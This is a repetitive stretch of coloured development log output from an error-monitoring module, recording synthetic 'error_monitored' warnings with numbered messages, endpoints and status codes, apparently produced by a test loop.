WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858449Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3178'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858498Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3179'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858548Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3180'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858596Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3181'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858648Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3182'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858703Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3183'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858755Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3184'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858807Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3185'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858856Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3186'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858906Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3187'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.858954Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3188'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859003Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3189'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859052Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3190'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859101Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3191'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859149Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3192'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859197Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3193'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859245Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3194'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859293Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3195'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859342Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3196'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859390Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3197'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859437Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3198'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859485Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m64[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3199'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859533Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3200'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859633Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3201'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859707Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3202'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859763Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3203'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859815Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3204'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859893Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3205'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.859973Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3206'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860031Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3207'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860087Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3208'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860139Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3209'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860188Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3210'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860237Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3211'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860286Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3212'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860336Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3213'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860385Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3214'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860434Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3215'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860482Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3216'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860530Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3217'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
